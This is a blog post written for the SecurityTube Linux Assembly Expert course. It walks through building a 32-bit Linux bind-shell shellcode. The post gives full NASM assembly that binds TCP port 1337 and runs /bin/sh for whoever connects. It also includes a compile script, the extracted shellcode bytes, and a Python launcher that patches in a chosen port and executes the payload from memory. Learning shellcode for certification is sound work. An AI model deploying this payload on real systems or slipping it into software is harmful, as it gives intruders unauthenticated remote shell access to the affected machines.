---
layout: single
title: SLAE Assignment 1 - Shell Bind Tcp
date: 2020-4-28
classes: wide
tags:
    - Shellcoding
    - Linux
    - x86
    - SLAE
---

![](/assets/images/slae/SHELLCODING32.png)

## Introduction
This is the first post of the SLAE exam assignments series.  

The first assignement is to create a a shell_bind_tcp shellcode that binds to a port and execs shell on incoming connection.  
The port number should be easily configurable.

All the source code for this assignment can be find on [my github repository](https://github.com/skr0x/SLAE/tree/master/Assignment-01-Shell_bind_tcp)
## Shellcode overview

### Socket basics

To listen and accept incoming connections, we need to follow those steps :

 - first we need to create a socket with the desired properties (here an IPv4, TCP socket)
 - then bind this socket to an address and port
 - put the socket in a listening mode to wait for connections
 - and finally, accept new incoming connection

We have two ways to do this : 
- Using the socket, bind, listen and accept4 syscalls 
- Or using the socketcall syscall 

In the following, we will use the socketcall syscall.

### Bind a shell to the socket

Once an incoming connection is accepted, we need to redirect the standards i/o streams to it so we can interact with the shell we will be executing.  
To do so we need to duplicate the socket file descriptor and overwrite the stdin(0), stdout(1) and stderr(2) files descriptor, using dup2 syscall.

Then we can run our shell using the execve syscall.

## The assembly code

*A list of prototypes, associated headers files and manpages, special variables etc... that will be used to complete this assignment, can be find at the bottom of this post.*

### Create the socket

We need to use the socketcall with SYS_SOCKET in EBX and ECX pointing to the socket function arguments on the stack.  
These arguments need to be AF_INET, SOCK_STREAM, 0 placed in reverse order because the stack is a LIFO data structure (Last In First Out).  

A socket file descriptor will be returned in EAX, we will save it in EDI for later use.

```nasm
;socket(AF_INET, SOCK_STREAM, 0)
;socketcall(SYS_SOCKET, *socket_args)
    xor ebx, ebx        ; set ebx to 0
    mul ebx             ; set eax and edx to 0

    push ebx            ; 0 for the protocol argument
    inc ebx	     
    push ebx            ; SOCK_STREAM
    push byte 0x2       ; AF_INET

    mov ecx, esp        ; ecx now points to the socket's arguments
                        ; ebx already set to SYS_SOCKET
    add al, 0x66        ; socketcall 
    int 0x80
    
    xchg edi, eax       ; we save the sockfd to edi 
                        ; (xchg is one byte opcode, so best than mov(2 bytes) 
                        ; because we dont care about eax value)
```

### Bind the socket

We push the sockaddr structure on the stack (always in reverse order, I will not mention it anymore), 
with values AF_INET, 0x3905 for port 1337 and INADDR_ANY for ip address 0.0.0.0 (all host's ips), and we save the address in ECX.

Next we need a pointer to the bind function's arguments, so we push sockfd (in EDI), the address of the sockaddr structure (in ECX) and the addrlen value 0x10
then we copy the stack address in ECX for the socketcall call, EBX is set to SYS_BIND already, and we set EAX to the socketcall value.

On success, return 0 in EAX

```nasm
;sockaddr{AF_INET, port, INADDR_ANY}
;bind(sockfd, *addr, addrlen)
;socketcall(SYS_BIND, *socket_args)
    pop    ebx          ; ebx set to SYS_BIND 
                        ; 2 was the last value pushed on the stack
    push   edx          ; INADDR_ANY (bind to 0.0.0.0)
    push word  0x3905   ; the port 1337
    push   bx           ; AF_INET
    mov    ecx,esp      ; ecx point to the sockaddr struct

    push   0x10         ; sockaddr struct length
    push   ecx          ; address to the sockaddr struct
    push   edi          ; sockfd previously saved

    mov    ecx,esp      ; ecx points to the bind's arguments
    push   0x66         ; socketcall
    pop    eax           
    int    0x80
```

### Listen for connections

The listen call type is the simpliest, we push sockfd and 0x00 (EDX)  
Then we make a socketcall call with EBX set to SYS_LISTEN

On success, return 0 in EAX

```nasm
;listen(sockfd, backlog)
;socketcall(SYS_LISTEN, *socket_args)
    push   edx          ; 0, no queue allowed
    push   edi          ; the sockfd previously saved
    mov    ecx,esp      ; ecx point to the listen's arguments
    shl    ebx, 1       ; SYS_LISTEN
                        ; shift one bit left (multiply by 2) so ebx is 4 
                        ; (2 bytes opcode, 3 bytes for: add ebx, 0x2
    mov    al,0x66      ; socketcall
    int    0x80
```

### Accept connection

Accept take three arguments : the socket file descriptor, a pointer to a sockaddr struct for the client informations and a pointer to the sockaddr length.  
But because we don't need the client informations and for a shorter shellcode we will these two pointers to null pointer.  
So we push the accept arguments sockfd (EDI), null pointer (EDX), null pointer (EDX)   
Then we make a socketcall call with EBX set to SYS_ACCEPT.

On success, return a new socket file descriptor in EAX 

```nasm
;accept(sockfd, *addr, *addrlen)
;socketcall(SYS_ACCEPT, *socket_args)
    push   edx          ; null pointer
    push   edx          ; null pointer, we don't care about client informations
    push   edi          ; sockfd
    mov    ecx,esp      ; ecx points to the accept's arguments
    inc    ebx          ; SYS_ACCEPT
    mov    al,0x66      ; socketcall
    int    0x80
```

### Overwrite standard I/O

Here we need to overwrite all standards I/O with the new socketfd.  
So we make a loop to make three dup2 call with the values of stderr (2), stdout (1), stdin (0),  
In this order so at the end we have ECX set to 0, and that will be usefull to gain some bytes for our shellcode length.

On success, return the new file descriptor in EAX (so 0 on the last call)

```nasm
;dup2(sockfd, stderr)
;dup2(sockfd, stdout)
;dup2(sockfd, stdin])
    xchg   ebx, eax     ; set ebx to the new sockfd from accept
    push byte 0x3       
    pop    ecx
link:
    dec    ecx          ; set ecx from 2 to 0 (stderr to stdin)
    mov    al,0x3f      ; dup2
    int    0x80
    jne    link         ; if ecx not equal to stdin, overwrite next standard I/O stream
```

### Pop a shell

Time to pop a shell,  
We push the "/bin//sh" string on the stack without forgetting the null byte, and we copy the address in EBX.  
ECX and EDX are already set null point (0x00) so we can make an execve call.

We don't care about a proper exit so we are done. 

```nasm
;execve("/bin//sh", NULL, NULL) 

    push   edx          ; string terminator 0x00
    push   0x68732f2f   ; push /bin//sh in reverse order
    push   0x6e69622f
    mov    ebx,esp      ; ebx point to /bin//sh string
                        ; ecx and edx are already set to 0x00 (Null pointer)
    mov    al,0xb       ; execve 
    int    0x80	
```

## Customise the port and exec the shellcode

Now we will compile and generate the shellcode using this script :

```bash
#!/bin/bash

printf "[x] Assembling...\n"
nasm -f elf32 $1.nasm -o $1.o

printf "[x] Linking...\n"
ld $1.o -o $1

printf "[x] Done !\n\n"

printf "Shellcode : \n"
objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|grep -v 'format'|cut -f2 -d:|cut -f1-6 -d' '|  
tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
```terminal_session
root@kali:~# ./compile.sh shell-bind-tcp
[x] Assembling...
[x] Linking...
[x] Done !

Shellcode : 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\x04\x66\xcd\x80\x97\x5b\x52\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10
\x51\x57\x89\xe1\x6a\x66\x58\xcd\x80\x52\x57\x89\xe1\xd1\xe3\xb0\x66\xcd\x80\x52\x52\x57\x89\xe1\x43\xb0\x66\xcd\x80
\x93\x6a\x03\x59\x49\xb0\x3f\xcd\x80\x75\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
```

Next to customise the port, we will integrate this shellcode into a python script :

```python
#!/usr/bin/python3

# Demey Alexandre
# PA-14186

from ctypes import CDLL, CFUNCTYPE, c_char_p, cast
from sys import argv
import argparse

# Setting the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-e", "--exec",
                    help="If set, the shellcode is printed to the screen then executed",
                    action="store_true")
parser.add_argument("-p", "--port", type=int,
                    help="Change the port to bind (Default:1337)")
args = parser.parse_args()

# Change port number if a custom one is given
port = 1337
if args.port and args.port > 0 and args.port <= 65535:
    port = args.port

# Format the port 
port = "{0:0{1}x}".format(port,4)
port = "\\x" + port[:2] + "\\x" + port[2:]

# Insert the port in the shellcode
shellcode_str = "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\x04\\x66\\xcd"\
"\\x80\\x97\\x5b\\x52\\x66\\x68{}\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x6a"\
"\\x66\\x58\\xcd\\x80\\x52\\x57\\x89\\xe1\\xd1\\xe3\\xb0\\x66\\xcd\\x80\\x52\\x52\\x57"\
"\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x03\\x59\\x49\\xb0\\x3f\\xcd\\x80\\x75"\
"\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd"\
"\\x80".format(port)

shellcode_bytes = bytes.fromhex(shellcode_str.replace('\\x',''))
print("Shellcode size : {}".format(len(shellcode_bytes)))
print('"{}"'.format(shellcode_str))

if args.exec :
    libc = CDLL("libc.so.6")

    c_shell_p = c_char_p(shellcode_bytes)

    launch = cast(c_shell_p, CFUNCTYPE(c_char_p))

    launch()
```

Then we can launch the script to set a new port and/or execute directly the shellcode :

![netcat-connection](/assets/images/slae/nc-connect.png)

### Ressources 

```c
#man socketcall
int socketcall(int call, unsigned long *args);
```

```c
#man socket
int socket(int domain, int type, int protocol);
```

```c
#man bind
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

```c
#man listen
int listen(int sockfd, int backlog);
```

```c
#man 2 accept
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

```c
#man dup2
int dup2(int oldfd, int newfd);
```

```c
#man execve
int execve(const char *filename, char *const argv[], char *const envp[]);
```

```c
#man 7 ip
struct sockaddr_in {
               sa_family_t    sin_family; /* address family: AF_INET */
               in_port_t      sin_port;   /* port in network byte order */
               struct in_addr sin_addr;   /* internet address */
           };
```

```c
#/usr/include/asm/unistd_32.h
#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
```

```c
#/usr/include/linux/net.h
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
```

```c
#/usr/include/netinet/in.h
#define	INADDR_ANY		((in_addr_t) 0x00000000)
```

```c
# cat /usr/include/bits/socket_type.h
  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define SOCK_STREAM SOCK_STREAM
```

```c
#/usr/include/bits/socket.h
#define PF_INET		2	/* IP protocol family.  */
#define AF_INET		PF_INET
```


***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
Student ID: PA-14186***